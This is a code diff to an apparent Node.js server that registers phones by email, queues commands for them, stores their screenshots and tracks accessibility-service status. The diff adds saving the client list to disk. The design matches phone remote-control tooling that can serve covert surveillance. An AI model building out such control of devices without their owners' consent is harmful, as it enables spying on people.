@@ -36,8 +36,58 @@ let config = loadConfig();
 
 const PORT = process.env.PORT || config.port || 3003;
 
+// ── State Persistence (Never lose registered client phones across server restarts) ──
+const CLIENTS_STORAGE_FILE = path.join(__dirname, "clients.json");
+
+function loadStoredClients() {
+  const map = new Map();
+  try {
+    if (fs.existsSync(CLIENTS_STORAGE_FILE)) {
+      const data = JSON.parse(fs.readFileSync(CLIENTS_STORAGE_FILE, "utf8"));
+      if (Array.isArray(data)) {
+        for (const item of data) {
+          if (item && item.email) {
+            const cleanEmail = item.email.trim().toLowerCase().replace(/[\u200B-\u200D\uFEFF\u202A-\u202E]/g, "");
+            map.set(cleanEmail, {
+              ...item,
+              email: cleanEmail
+            });
+          }
+        }
+        console.log(`[HUB] 📂 Loaded ${map.size} persisted client phones from clients.json`);
+      }
+    }
+  } catch (err) {
+    console.error("[HUB] ⚠️ Error loading clients.json:", err.message);
+  }
+  return map;
+}
+
+let saveClientsTimer = null;
+function persistClientsToDisk() {
+  if (saveClientsTimer) return;
+  saveClientsTimer = setTimeout(() => {
+    saveClientsTimer = null;
+    try {
+      const array = Array.from(clients.values()).map(c => ({
+        email: c.email,
+        name: c.name || c.email.split('@')[0],
+        lastSeen: c.lastSeen,
+        batteryLevel: c.batteryLevel,
+        isCharging: c.isCharging,
+        appVersion: c.appVersion || "1.2.8-sec",
+        accessibilityEnabled: c.accessibilityEnabled !== false,
+        status: c.status || "offline"
+      }));
+      fs.writeFileSync(CLIENTS_STORAGE_FILE, JSON.stringify(array, null, 2), "utf8");
+    } catch (e) {
+      console.error("[HUB] ⚠️ Error persisting clients to disk:", e.message);
+    }
+  }, 1500);
+}
+
 // ── In-Memory State ─────────────────────────────────────────────────────────────
-const clients = new Map();             // email -> { email, lastSeen, batteryLevel, isCharging, appVersion, accessibilityEnabled, status, ip }
+const clients = loadStoredClients();   // email -> { email, lastSeen, batteryLevel, isCharging, appVersion, accessibilityEnabled, status, ip }
 const pendingCommands = new Map();     // email -> [ commandObject ]
 const latestScreenshots = new Map();   // email -> { buffer, contentType, timestamp }
 const longPollWaiters = new Map();      // email -> [ { res, timer } ]
@@ -92,6 +142,7 @@ app.post("/api/client-app/heartbeat", (req, res) => {
     ip: req.ip || req.socket.remoteAddress || ""
   };
   clients.set(normEmail, clientData);
+  persistClientsToDisk();
 
   res.json({
     success: true,
@@ -111,6 +162,7 @@ app.get("/api/client-app/poll", (req, res) => {
   const client = clients.get(email) || { email, appVersion: "1.2.9" };
   client.lastSeen = Date.now();
   clients.set(email, client);
+  persistClientsToDisk();
 
   // Check if there is already a queued command
   const queue = pendingCommands.get(email);
